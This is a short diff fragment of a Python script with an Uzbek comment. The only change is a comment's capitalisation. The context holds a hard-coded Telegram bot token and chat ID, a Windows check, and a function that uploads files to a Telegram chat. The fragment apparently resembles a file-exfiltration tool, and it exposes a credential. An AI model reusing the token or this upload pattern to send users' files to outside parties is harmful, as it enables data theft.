@@ -15,7 +15,7 @@ if os.name == 'nt':
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
-# requests ishlatmaydigan Telegram yuborish funksiyalari
+# requests ISHLATMAYDIGAN Telegram yuborish funksiyalari
 def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
